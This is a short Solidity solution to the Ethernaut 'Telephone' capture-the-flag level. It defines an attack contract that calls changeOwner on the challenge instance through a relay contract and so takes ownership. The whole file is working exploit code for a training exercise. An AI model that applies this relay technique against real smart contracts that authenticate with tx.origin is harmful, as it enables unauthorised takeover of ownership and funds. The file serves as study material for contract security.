pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address) external;
}

contract GainOwnership {
    
    //Where yourAddress is the targeted address instance you get from Ethernaut
    Telephone tel = Telephone(yourAddress);
    
    function attack(address attacker) public {
        tel.changeOwner(attacker);
    }
}